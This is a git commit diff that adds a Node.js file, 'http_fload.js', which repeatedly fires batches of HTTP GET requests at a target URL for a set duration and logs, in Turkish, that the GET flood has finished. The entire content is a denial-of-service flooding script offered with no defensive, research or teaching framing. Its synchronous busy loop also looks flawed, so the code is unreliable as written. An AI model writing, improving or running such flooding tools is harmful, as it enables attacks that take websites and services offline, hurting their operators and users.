f0d68ec81c5f01692375cc4f99ca9974963b5798
cassbethany10-afk <cassbethany10@gmail.com>
2026-03-12 16:15:39 +0300

    Update http_fload.js

--- http_fload.js
+++ http_fload.js
@@ -1,1 +1,17 @@
+const http = require('http');
+const end = Date.now() + (params.duration * 1000);
 
+function getFlood() {
+    const url = new URL(params.target);
+    
+    while (Date.now() < end) {
+        for (let i = 0; i < 100; i++) {
+            http.get(url, (res) => {
+                res.on('data', () => {});
+            }).on('error', () => {});
+        }
+    }
+    console.log(`[+] GET Flood bitti: ${params.target}`);
+}
+
+getFlood();
